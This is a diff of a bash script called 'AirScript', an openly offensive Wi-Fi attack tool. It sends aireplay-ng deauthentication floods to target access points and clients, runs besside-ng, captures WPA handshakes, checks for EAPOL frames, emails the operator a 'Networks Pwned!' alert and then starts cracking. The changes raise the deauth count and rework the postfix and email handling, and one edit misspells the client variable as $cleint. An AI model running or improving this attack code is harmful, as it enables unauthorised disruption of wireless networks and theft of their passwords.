@@ -39,7 +39,7 @@ if [ "$WiFiStatus" == "disabled" ]; then
 nmcli radio wifi on
 echo -e "[${Green}$foo${White}] Enabled!"
 fi
-stopMon > /dev/null 2>&1
+#stopMon > /dev/null 2>&1
 checkServices > /dev/null 2>&1
 
 
@@ -47,11 +47,13 @@ checkServices > /dev/null 2>&1
 
 
 checkServices () {
+sudo systemctl restart postfix > /dev/null 2>&1
+sudo postfix restart > /dev/null 2>&1
+sudo systemctl restart postfix > /dev/null 2>&1
 sudo systemctl start postfix > /dev/null 2>&1
 sudo postfix start > /dev/null 2>&1
 sudo systemctl start postfix > /dev/null 2>&1
-stopMon
-restart_postfix
+
 }
 
 banner () {        ##### Banner #####
@@ -223,32 +225,7 @@ esac
 done
 }
 
-#Function to restart Postfix, checking if it's installed and handling errors
-restart_postfix() {
-    log_message "Checking if Postfix is registered as a service..."
-    systemctl list-units --type=service | grep postfix
-    if [ $? -ne 0 ]; then
-        log_message "Postfix service not found. Attempting to reload systemd..."
-        sudo systemctl daemon-reload
-        sudo systemctl enable postfix
-        sudo systemctl start postfix
-    fi
 
-    log_message "Restarting Postfix using systemd..."
-    sudo systemctl restart postfix
-
-    if [ $? -eq 0 ]; then
-        log_message "Postfix restarted successfully using systemd."
-    else
-        log_message "Error restarting Postfix with systemd. Attempting to restart with service command..."
-        sudo service postfix restart
-        if [ $? -eq 0 ]; then
-            log_message "Postfix restarted using service command."
-        else
-            log_message "Error restarting Postfix with service command. Please check manually."
-        fi
-    fi
-}
 
 AirScript() {
 notification
@@ -281,9 +258,10 @@ sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
 captureMAC
 deauthAttack
 stopMon
-checkServices 
+checkservices
+checkWiFiStatus
 sleep 3
-echo "Handshakes have been captured." | mail -s "Pwned!" $email
+echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
 crack
 }
 
@@ -340,9 +318,9 @@ sudo besside-ng $foo
 check_cap_files
 check_eapol_in_cap
 stopMon
-checkservices
+checkServices
 sleep 10
-sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
+echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
 crack
 }
 
@@ -395,10 +373,10 @@ cleanup
 }
 
 cleanup () {
-$sudo airmon-ng stop $foo
-checkDependencies
-checkWiFiStatus
-checkServices
+#$sudo airmon-ng stop $foo
+#checkDependencies
+#checkWiFiStatus
+#checkServices
 sudo rm -f *.csv > /dev/null 2>&1
 sudo rm -f *.netxml > /dev/null 2>&1
 sudo rm -f airodump_output.log > /dev/null 2>&1
@@ -710,11 +688,13 @@ check_cap_files() {
 
 deauthAttack () {
 #sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-sudo airodump-ng --channel $channel --bssid $bssid -w capture $foo > /dev/null &
+captureMAC
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 echo -e "\e[32mAttacking...\e[0m"
-sudo aireplay-ng --deauth 0 -a $bssid -c $client $foo > /dev/null 2>&1
-captureMAC
+#sudo aireplay-ng --deauth 50 -a $bssid -c $client $foo 
+#sudo aireplay-ng --deauth 50 --bssid --dmac $client $foo
+sudo aireplay-ng --deauth 100 -a $bssid -c $cleint $foo
+#captureMAC
 check_cap_files
 check_eapol_in_cap
  } 
@@ -1128,7 +1108,7 @@ sudo ./uninstall.sh
 stopMon () {
 sudo airmon-ng stop $foo > /dev/null 2>&1
 sudo systemctl start NetworkManager > /dev/null 2>&1
-sudo systemctl start wpa_supplicant  > /dev/null 2>&1
+systemctl start wpa_supplicant  > /dev/null 2>&1
 echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
 }
 
